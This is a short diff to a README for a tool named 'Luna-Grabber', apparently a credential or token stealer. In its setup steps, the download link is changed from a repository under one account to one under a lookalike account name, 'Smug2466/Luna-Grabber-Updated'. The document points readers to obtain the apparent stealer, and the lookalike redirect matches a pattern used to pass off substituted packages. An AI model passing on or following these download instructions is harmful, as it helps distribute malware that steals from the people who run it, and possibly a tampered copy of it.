@@ -86,7 +86,7 @@
 ```
 Make sure you have Python 3.11+ installed and it is added to your path.
 ```
-### 2. [Download](https://github.com/Smug246/Luna-Grabber/archive/refs/heads/main.zip) The Files:
+### 2. [Download](https://github.com/Smug2466/Luna-Grabber-Updated/archive/refs/heads/main.zip) The Files:
 
 ```
 Once you've downloaded the files extract the folder so it's no longer a .zip file.
